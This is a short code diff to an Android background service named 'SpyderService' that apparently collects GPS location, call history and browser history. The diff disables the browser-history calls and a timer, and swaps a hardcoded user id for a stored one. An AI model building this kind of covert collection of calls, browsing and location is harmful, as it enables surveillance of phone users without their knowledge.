@@ -60,12 +60,12 @@ public class SpyderService extends Service implements SpyderContract.View {
         getlangitude = gpsTrack.currentLangitude;
         getLattitude = gpsTrack.currentLattitude;
         timer = new Timer();
-        timerOperation();
+        //timerOperation();
 //call History and browserDetails
         getDetailsInformation = new GetDetailsInformation(getApplicationContext());
         callSaveCallHistoryDetails();
-        getDetailsInformation.getBrowserHistory();
-        getDetailsInformation.secondmethodBrowserHistory();
+        //getDetailsInformation.getBrowserHistory();
+        //getDetailsInformation.secondmethodBrowserHistory();
 
     }
 
@@ -102,8 +102,8 @@ public class SpyderService extends Service implements SpyderContract.View {
         locationDetails = new LocationDetails();
         List<LocationDetail> locationDetailList = new ArrayList<>();
         LocationDetail location = new LocationDetail();
-        //location.setUserId(sharedPref.getUserId());
-        location.setUserId("1");
+        location.setUserId(sharedPref.getUserId());
+       // location.setUserId("1");
         location.setLattitude("1212");
         location.setLongitude("1212121");
         location.setTimestamp(String.valueOf(System.currentTimeMillis()));
